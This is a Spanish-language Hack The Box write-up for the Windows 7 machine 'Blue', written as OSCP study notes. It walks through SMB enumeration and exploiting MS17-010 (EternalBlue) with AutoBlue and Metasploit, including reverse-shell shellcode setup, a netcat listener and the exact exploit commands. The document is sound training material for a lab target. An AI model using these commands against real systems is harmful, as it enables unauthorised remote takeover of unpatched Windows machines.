[🔵 Blue — HTB [Windows · Easy] 32315bd2d16c8056a1b3ed09be9f188b.md](https://github.com/user-attachments/files/28262333/Blue.HTB.Windows.Easy.32315bd2d16c8056a1b3ed09be9f188b.md)
# 🔵 Blue — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows 7 SP1 x64 | **Dificultad:** Easy | **CVE principal:** MS17-010 (EternalBlue)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.40` |
| Vector | MS17-010 — EternalBlue SMB RCE |
| Acceso inicial | Shell directa como **NT AUTHORITYSYSTEM** |
| PrivEsc | No necesaria (ya somos SYSTEM desde el foothold) |
| Exploit usado | AutoBlue-MS17-010 (sin Metasploit) |
| Flags | `user.txt`  • `root.txt` |

---

# 1. Reconocimiento

## Nmap — Escaneo de puertos

```bash
nmap -sS -p- --min-rate 5000 -oN blue_ports.nmap 10.10.10.40
```

```bash
nmap -sV -sC -p 135,139,445,49152,49153,49154,49155,49156,49157 -oN blue_full.nmap 10.10.10.40
```

### Resultados relevantes

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 SP1 (workgroup: WORKGROUP)
49152/tcp open  msrpc
49153/tcp open  msrpc
...

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 SP1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC
|_  System time: ...
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**Conclusión inmediata:** Windows 7 SP1 + SMB abierto + message_signing disabled = casi seguro vulnerable a MS17-010.

---

# 2. Enumeración SMB

```bash
# Listar shares con null session
smbclient -L //10.10.10.40 -N

# Ver shares y permisos con smbmap
smbmap -H 10.10.10.40

# Enumerar con crackmapexec
crackmapexec smb 10.10.10.40 --shares
```

> **Tip IPC$:** Cuando ves `IPC$` en los resultados, ese share es el canal de comunicación entre procesos de red (no para archivos). Sirve para enumerar usuarios, grupos y políticas sin autenticación:
> 

> `bash
> 

> rpcclient -U "" -N 10.10.10.40
> 

> enumdomusers
> 

> querydominfo
> 

> enum4linux -a 10.10.10.40
> 

> `
> 

## Confirmación de MS17-010

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
```

```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Description: A critical remote code execution vulnerability exists
|                  in Microsoft SMBv1 servers (ms17-010).
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

**Confirmado: vulnerable a EternalBlue.**

---

# 3. Explotación — MS17-010 con AutoBlue (sin Metasploit)

## ¿Por qué AutoBlue y no zzz_[exploit.py](http://exploit.py)?

El script `zzz_exploit.py` del repositorio original de MS17-010 depende de **named pipes** (`samr`, `lsarpc`, `browser`) para funcionar. En Blue, el acceso anónimo a esos pipes está restringido, dando el error:

```
Not found accessible named pipe
```

**AutoBlue** resuelve esto inyectando el shellcode directamente en la memoria del kernel, **sin depender de named pipes**. Es más estable y funciona en escenarios donde zzz_exploit falla.

También hubo problemas de compatibilidad entre Python 2 y 3 con `impacket` en zzz_exploit — AutoBlue evita esa dependencia.

## Paso A — Clonar AutoBlue

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
pip install -r requirements.txt
```

## Paso B — Generar shellcode (stageless)

```bash
chmod +x shell_prep.sh
./shell_prep.sh
```

Cuando pida parámetros:

- **LHOST:** `10.10.14.27` (tu IP de HTB)
- **LPORT:** `4444`
- **Payload:** `1` → Regular CMD Shell
- **Type:** `1` → **Stageless** ← importante para usar con Netcat

> **Stageless vs Staged:** Un payload stageless (`sc_x64.bin`) incluye todo el código en un solo bloque. Un staged necesita conectarse de vuelta para descargar el resto del payload. Para Netcat siempre usar stageless — los staged requieren un handler de Metasploit para enviar el segundo stage.
> 

Esto genera `shellcode/sc_x64.bin` (y `sc_x86.bin` para 32-bit).

## Paso C — Listener con Netcat

```bash
nc -lvnp 4444
```

## Paso D — Ejecutar el exploit

```bash
# Para Windows 7 / Server 2008 R2 (x64)
python3 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

### Output esperado

```
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

Inmediatamente después del `done`, el listener de Netcat recibe la conexión.

---

# 4. Post-Explotación

## Shell recibida

```
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
nt authority\system
```

Acceso directo como **NT AUTHORITYSYSTEM**. Sin escalada necesaria.

## Buscar flags

```
:: User flag
dir /s /b C:\user.txt
type C:\Users\haris\Desktop\user.txt

:: Root flag
dir /s /b C:\root.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

# 5. Troubleshooting — Errores comunes

| Error | Causa | Solución |
| --- | --- | --- |
| `Not found accessible named pipe` | zzz_[exploit.py](http://exploit.py) necesita pipes que están bloqueados | Usar AutoBlue en su lugar |
| `Address already in use` al lanzar nc | Puerto ocupado por proceso previo | `fuser -k 4444/tcp` |
| Exploit cuelga sin respuesta | Shellcode staged con Netcat | Regenerar con `shell_prep.sh` opción stageless (1) |
| `Connection refused` al exploit | SMBv1 deshabilitado o firewall | Verificar con `nmap --script smb-protocols` |

---

# 5b. ERROR_CODE 193 — Metasploit ms17_010_psexec

Este error aparece cuando usas `windows/smb/ms17_010_psexec` contra un sistema **Windows XP / Server 2003 (x86)**.

```
[*] 10.129.5.30:445 - Target OS: Windows 5.1   ← XP = arquitectura x86
[*] 10.129.5.30:445 - Uploading payload... FrDJQITr.exe
[-] 10.129.5.30:445 - Service failed to start, ERROR_CODE: 193
[*] Exploit completed, but no session was created.
```

**193 = `ERROR_BAD_EXE_FORMAT`** en Windows. Metasploit subió un `.exe` de 64 bits a un sistema de 32 bits. Windows no puede ejecutarlo.

> **Nota importante:** Blue (10.10.10.40) es Windows 7 x64. Si ves `Windows 5.1` estás atacando una máquina diferente — probablemente **Legacy** (XP) cuya IP en instancia Pwnbox empieza por `10.129.x.x`.
> 

## Solución en Metasploit

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit > set RHOSTS 10.129.5.30
msf6 exploit > set LHOST 10.10.14.27
msf6 exploit > set LPORT 4444

# Forzar payload x86 para XP/2003
msf6 exploit > set PAYLOAD windows/shell_reverse_tcp
msf6 exploit > run
```

Forzar `windows/shell_reverse_tcp` (x86) en lugar del payload default soluciona el problema de arquitectura.

## Solución sin Metasploit (AutoBlue para XP)

```bash
# Para XP/2003 usar exploit8 con shellcode x86
./shell_prep.sh
# → seleccionar x86 cuando pregunte la arquitectura

python3 eternalblue_exploit8.py 10.129.5.30 shellcode/sc_x86.bin
#                              ↑ exploit8 = XP/2003    ↑ x86, no x64
```

| Versión Windows | Exploit AutoBlue | Shellcode |
| --- | --- | --- |
| XP / 2003 | `eternalblue_exploit8.py` | `sc_x86.bin` |
| Vista / 7 / 2008 R2 | `eternalblue_exploit7.py` | `sc_x64.bin` |

---

# 6. ¿Qué es MS17-010 (EternalBlue)?

**MS17-010** es una vulnerabilidad crítica en la implementación de **SMBv1** de Windows, publicada por Microsoft en marzo de 2017 tras ser filtrada por el grupo Shadow Brokers del arsenal de la NSA.

El fallo está en cómo SMBv1 procesa ciertas peticiones de transacción (`SMB_COM_TRANSACTION2`). Un atacante puede enviar un paquete malformado que provoca un **buffer overflow en el kernel de Windows**, permitiendo ejecutar código arbitrario con privilegios de SYSTEM, sin necesitar credenciales.

Lo que lo hace históricamente devastador: fue el vector principal de **WannaCry** (mayo 2017) y **NotPetya** (junio 2017), dos de los ransomwares más destructivos de la historia, que se propagaron automáticamente por redes enteras usando exactamente este exploit.

**Por qué obtienes SYSTEM directamente:** El proceso SMB corre en el contexto del kernel de Windows con los máximos privilegios del sistema. No hay usuario intermedio — el RCE ocurre directamente como `NT AUTHORITY\SYSTEM`.

---

# 7. Moralejas y Notas para el OSCP

## Moraleja 1 — zzz_exploit vs AutoBlue: saber cuándo cambiar de herramienta

La primera reacción ante MS17-010 suele ser lanzar `zzz_exploit.py`. En Blue falla con `Not found accessible named pipe` porque los named pipes están restringidos. La lección es no perder tiempo intentando forzar la herramienta equivocada — cambiar a AutoBlue que inyecta directamente en el kernel sin depender de pipes.

Para el OSCP: tener los dos exploits listos y saber qué error indica cuál usar.

---

## Moraleja 2 — Stageless siempre con Netcat

El payload stageless incluye todo el código en un bloque. El staged necesita un handler completo de Metasploit para enviar el segundo stage. Si usas `nc` como listener y el exploit no conecta o conecta y cierra inmediatamente, el problema casi siempre es que el payload es staged. Regenerar con `shell_prep.sh` eligiendo opción `1` (stageless) resuelve el problema.

---

## Moraleja 3 — message_signing disabled es una señal de alerta

Cuando nmap muestra `message_signing: disabled (dangerous, but default)` en SMB, es una bandera roja que apunta a posibles ataques MITM y relay. Combinado con Windows 7 y SMBv1, orienta directamente hacia MS17-010. Aprender a leer esas señales en el output de nmap acelera enormemente la identificación del vector.

---

## Moraleja 4 — Confirmar el OS y la arquitectura antes del exploit

Blue es Windows 7 x64 — usa `exploit7` y `sc_x64.bin`. Si confundes la arquitectura y usas el payload incorrecto, el exploit puede completarse pero no abrir sesión. Siempre confirmar con el output de nmap (`OS: Windows 7 Professional 7601 SP1`) antes de ejecutar.

| Windows | Exploit | Shellcode |
| --- | --- | --- |
| XP / 2003 | exploit8 | sc_x86.bin |
| 7 / 2008 R2 | exploit7 | sc_x64.bin |

---

## Moraleja 5 — ERROR_CODE 193 = mismatch de arquitectura, no fallo del exploit

Cuando Metasploit dice `SYSTEM session obtained` pero luego `Service failed to start, ERROR_CODE: 193`, el exploit funcionó — el problema es que subió un `.exe` de 64 bits a un sistema de 32 bits. No es un fallo del exploit, es un problema de arquitectura del payload. Forzar `set PAYLOAD windows/shell_reverse_tcp` resuelve esto en XP/2003.

---

## Moraleja 6 — El patrón de Blue para máquinas Windows legacy

```
nmap → Windows 7/2008 + SMB abierto + message_signing disabled
    ↓
nmap --script smb-vuln-ms17-010 → confirmar vulnerabilidad
    ↓
AutoBlue exploit7 + shellcode stageless x64
    ↓
NT AUTHORITY\SYSTEM directo
```

Este patrón se repite en varias máquinas del OSCP. Una vez automatizado, tarda menos de 5 minutos desde el reconocimiento hasta SYSTEM.

---

# 8. Lecciones aprendidas

| Concepto | Detalle |
| --- | --- |
| **Adaptabilidad de exploits** | Si zzz_exploit falla por pipes bloqueados, AutoBlue es la alternativa estable |
| **Stageless > Staged con Netcat** | Los payloads staged necesitan un handler completo (Metasploit) para funcionar |
| **SMB = superficie de ataque crítica** | Versión + OS detectados en nmap ya orientan hacia MS17-010 |
| **Windows 7 sin parches = SYSTEM** | Sin MS17-010 aplicado, cualquiera con red puede tomar el control completo |
| **IPC$ no es para archivos** | Sirve para enumeración de usuarios/grupos via rpcclient/enum4linux |

---

# 8. Comandos clave (resumen rápido)

```bash
# Verificar vulnerabilidad
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40

# Enumerar SMB
smbmap -H 10.10.10.40
enum4linux -a 10.10.10.40

# Generar shellcode
cd AutoBlue-MS17-010 && ./shell_prep.sh
# → LHOST, LPORT, payload=1, type=1 (stageless)

# Listener
nc -lvnp 4444

# Explotar
python3 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin

# Flags
dir /s /b C:\user.txt
dir /s /b C:\root.txt
```
